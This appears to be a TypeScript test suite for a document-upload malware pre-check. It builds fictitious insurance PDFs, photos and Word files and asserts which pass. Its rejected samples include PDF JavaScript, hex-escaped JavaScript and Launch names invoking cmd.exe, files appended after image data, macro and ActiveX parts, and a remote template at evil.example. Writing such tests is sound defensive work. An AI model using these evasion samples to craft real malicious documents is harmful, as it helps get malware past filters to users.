/**
 * DearPolicy's local file check (lib/scanning/local-file-check.ts), used when the malware scanner has never seen a
 * file. Made-up documents built here (PDFs with and without compressed object streams, photos, Word files): ordinary
 * ones pass; ones with active content, hidden data or parts that cannot be inspected do not. No network.
 *   npm run scanning:local-file-check-test
 */
import assert from "node:assert/strict";
for (const k of Object.keys(process.env)) if (/ANTHROPIC|OPENAI|GEMINI|_API_KEY/i.test(k)) delete process.env[k];
globalThis.fetch = (() => { throw new Error("no network in this test"); }) as typeof fetch;

let passed = 0;
const failed: string[] = [];
async function t(name: string, fn: () => Promise<void>) {
  try { await fn(); passed++; console.log("  ok  " + name); }
  catch (e) { failed.push(name); console.error("  FAIL " + name + ": " + (e instanceof Error ? e.message.split("\n")[0] : String(e))); }
}

async function main() {
  const { checkFileLocally } = await import("@/lib/scanning/local-file-check");
  const { PDFDocument, StandardFonts, PDFName, PDFString } = await import("pdf-lib");
  const sharp = (await import("sharp")).default;
  const JSZip = (await import("jszip")).default;
  const enc = (s: string) => new TextEncoder().encode(s);
  const cat = (...parts: Uint8Array[]) => { const out = new Uint8Array(parts.reduce((n, p) => n + p.length, 0)); let o = 0; for (const p of parts) { out.set(p, o); o += p.length; } return out; };

  async function schedulePdf(lines: string[], opts: { objectStreams?: boolean; js?: string; link?: boolean } = {}) {
    const doc = await PDFDocument.create();
    const font = await doc.embedFont(StandardFonts.Helvetica);
    const page = doc.addPage([595, 842]);
    lines.forEach((l, i) => page.drawText(l, { x: 50, y: 780 - i * 18, size: 11, font }));
    if (opts.js) doc.addJavaScript("hello", opts.js);
    if (opts.link) {
      const link = doc.context.obj({ Type: "Annot", Subtype: "Link", Rect: [50, 50, 200, 70], A: { S: "URI", URI: PDFString.of("https://insurer.example/claims") } });
      page.node.set(PDFName.of("Annots"), doc.context.obj([doc.context.register(link)]));
    }
    return doc.save({ useObjectStreams: opts.objectStreams ?? true });
  }
  const takaful = ["Sijil Takaful (fictitious) - Lindung Keluarga", "Peserta: Nur Aisyah Rahman", "Manfaat kematian RM250,000"];
  const home = ["Thames Home (fictitious) - Policy schedule", "Policyholder: Oliver Grant", "Buildings £350,000"];

  await t("ordinary made-up PDFs pass, with or without compressed object streams, with a web link", async () => {
    for (const pdf of [await schedulePdf(takaful), await schedulePdf(home, { objectStreams: false }), await schedulePdf(home, { link: true })]) {
      const r = checkFileLocally(pdf); assert.deepEqual(r, { ok: true, format: "pdf" }, JSON.stringify(r));
    }
  });
  await t("a PDF with JavaScript is refused, in a compressed object stream or in plain objects", async () => {
    for (const objectStreams of [true, false]) {
      const r = checkFileLocally(await schedulePdf(takaful, { js: "app.alert('x')", objectStreams }));
      assert.equal(r.ok, false); assert.equal(!r.ok && r.reason, "active_content");
    }
  });
  await t("hex-escaped names (/J#61vaScript, /L#61unch) and embedded files or launch actions are refused", async () => {
    const plain = new TextDecoder("latin1").decode(await schedulePdf(home, { objectStreams: false }));
    for (const inject of ["/J#61vaScript (app.alert(1))", "/S /L#61unch /F (cmd.exe)", "/EmbeddedFiles 9 0 R", "/XFA 7 0 R", "/S /SubmitForm"]) {
      const bad = enc(plain.replace("/Type /Catalog", "/Type /Catalog " + inject));
      const r = checkFileLocally(bad); assert.equal(!r.ok && r.reason, "active_content", inject);
    }
  });
  await t("an object stream that cannot be read (encrypted, or in another encoding) is not passed", async () => {
    const body = "%PDF-1.7\n1 0 obj\n<< /Type /ObjStm /N 1 /First 4 /Filter /FlateDecode /Length 8 >>\nstream\n\x01\x02\x03\x04\x05\x06\x07\x08\nendstream\nendobj\ntrailer\n<< /Encrypt 5 0 R /Root 2 0 R >>\n%%EOF\n";
    const r = checkFileLocally(enc(body)); assert.equal(!r.ok && r.reason, "not_inspectable");
    const other = body.replace("/FlateDecode", "/LZWDecode");
    assert.equal(!(checkFileLocally(enc(other)) as { ok: boolean }).ok, true);
  });
  await t("random bytes inside an image stream never look like a key: a scanned PDF with a photo passes", async () => {
    const doc = await PDFDocument.create();
    const noise = await sharp({ create: { width: 400, height: 400, channels: 3, background: { r: 128, g: 128, b: 128 }, noise: { type: "gaussian", mean: 128, sigma: 60 } } }).jpeg().toBuffer();
    const img = await doc.embedJpg(noise);
    doc.addPage([400, 400]).drawImage(img, { x: 0, y: 0, width: 400, height: 400 });
    const withKeyInImage = cat(await doc.save());
    assert.deepEqual(checkFileLocally(withKeyInImage), { ok: true, format: "pdf" });
    // Even when the stream data spells a key, it is data, not a dictionary.
    const raw = new TextDecoder("latin1").decode(await schedulePdf(home, { objectStreams: false }));
    const i = raw.indexOf("stream\n") + 7;
    const spelled = enc(raw.slice(0, i) + "/JS" + raw.slice(i + 3));
    assert.equal(checkFileLocally(spelled).ok, true);
  });
  await t("a PDF missing its end marker is refused", async () => {
    const pdf = await schedulePdf(home);
    assert.equal(!checkFileLocally(pdf.subarray(0, pdf.length - 400)).ok, true);
  });
  await t("photos pass as JPEG, PNG and WebP; a file hidden after the image's end is refused", async () => {
    const base = sharp({ create: { width: 120, height: 80, channels: 3, background: { r: 240, g: 240, b: 230 } } });
    for (const [fmt, buf] of [["jpeg", await base.clone().jpeg().toBuffer()], ["png", await base.clone().png().toBuffer()], ["webp", await base.clone().webp().toBuffer()]] as const) {
      assert.deepEqual(checkFileLocally(new Uint8Array(buf)), { ok: true, format: fmt });
      const hidden = cat(new Uint8Array(buf), enc("PK\x03\x04 hidden archive with a script inside, more than a few bytes long"));
      assert.equal(checkFileLocally(hidden).ok, false, fmt + " with data after its end");
    }
  });
  async function docx(extra: Record<string, string> = {}, rels?: string) {
    const z = new JSZip();
    z.file("[Content_Types].xml", '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"/>');
    z.file("_rels/.rels", '<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/></Relationships>');
    z.file("word/document.xml", '<?xml version="1.0"?><w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body><w:p><w:r><w:t>Wanderlust Travel (fictitious). Traveller: Tan Wei Ming. Medical S$250,000.</w:t></w:r></w:p></w:body></w:document>');
    z.file("word/_rels/document.xml.rels", rels ?? '<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId9" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://travel.example/claims" TargetMode="External"/></Relationships>');
    for (const [k, v] of Object.entries(extra)) z.file(k, v);
    return new Uint8Array(await z.generateAsync({ type: "uint8array", compression: "DEFLATE" }));
  }
  await t("a Word file with text and a web link passes; macros, ActiveX, embedded objects or a remote template are refused", async () => {
    assert.deepEqual(checkFileLocally(await docx()), { ok: true, format: "docx" });
    for (const extra of [{ "word/vbaProject.bin": "x" }, { "word/activeX/activeX1.xml": "<x/>" }, { "word/embeddings/oleObject1.bin": "x" }] as Record<string, string>[]) {
      const r = checkFileLocally(await docx(extra)); assert.equal(!r.ok && r.reason, "active_content", Object.keys(extra)[0]);
    }
    const remote = '<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="https://evil.example/t.dotm" TargetMode="External"/></Relationships>';
    const r = checkFileLocally(await docx({}, remote)); assert.equal(!r.ok && r.reason, "active_content");
  });
  await t("empty, oversize and unaccepted files are refused", async () => {
    assert.equal(!checkFileLocally(new Uint8Array()).ok, true);
    assert.equal((checkFileLocally(await schedulePdf(home), 100) as { reason?: string }).reason, "too_large");
    assert.equal((checkFileLocally(enc("MZ\x90\x00 an executable pretending to be a document")) as { reason?: string }).reason, "unsupported_type");
    assert.equal((checkFileLocally(enc("just some text, not a document at all")) as { reason?: string }).reason, "unsupported_type");
  });
  console.log(`\nlocal file check: ${passed} passed, ${failed.length} failed`);
  if (failed.length) process.exit(1);
}
main().catch((e) => { console.error(e); process.exit(1); });
